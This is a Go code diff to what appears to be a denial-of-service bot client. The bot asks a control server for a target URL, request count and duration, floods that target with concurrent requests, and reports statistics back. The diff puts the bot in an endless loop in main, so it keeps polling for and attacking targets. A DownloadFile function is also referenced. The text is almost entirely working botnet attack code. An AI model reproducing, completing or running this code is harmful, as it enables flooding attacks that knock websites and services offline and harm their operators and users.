@@ -31,9 +31,9 @@ var fileName = getCurrentFileName()
 
 func main() {
 	const serverURL = "http://localhost:5000"
-	// for {
-	StartBot(serverURL)
-	// }
+	for {
+		StartBot(serverURL)
+	}
 }
 
 func getCurrentFileName() string {
@@ -68,7 +68,7 @@ func SendRequests(target string, requestsNum int, goroutinesNum int, mode string
 	}()
 
 	for response := range ch {
-		statusCodes = append(statusCodes, response.StatusCode)
+		// statusCodes = append(statusCodes, response.StatusCode)
 		fmt.Println("v4")
 		fmt.Println(response.StatusCode)
 		response.Body.Close()
@@ -157,26 +157,21 @@ func StartBot(serverUrl string) {
 
 	targetObject := GetTargetInfo(serverUrl)
 
-	for i := 0; i < 2; i++ {
-		if targetObject.Status && (targetObject.TargetUrl != "") {
-			var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
-				targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
-			SendBotStats(serverUrl, *RequestInfo)
-		}
-
-		if !targetObject.Status {
-			fmt.Println("Server status is set to false.")
-			time.Sleep(10 * time.Second)
-		}
-
-		if targetObject.TargetUrl == "" {
-			fmt.Println("No target link specified.")
-			time.Sleep(10 * time.Second)
-		}
-
-		fmt.Println("Hi")
+	if targetObject.Status && (targetObject.TargetUrl != "") {
+		var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
+			targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
+		SendBotStats(serverUrl, *RequestInfo)
 	}
 
+	if !targetObject.Status {
+		fmt.Println("Server status is set to false.")
+		time.Sleep(10 * time.Second)
+	}
+
+	if targetObject.TargetUrl == "" {
+		fmt.Println("No target link specified.")
+		time.Sleep(10 * time.Second)
+	}
 }
 
 func DownloadFile(filepath string, url string) error {
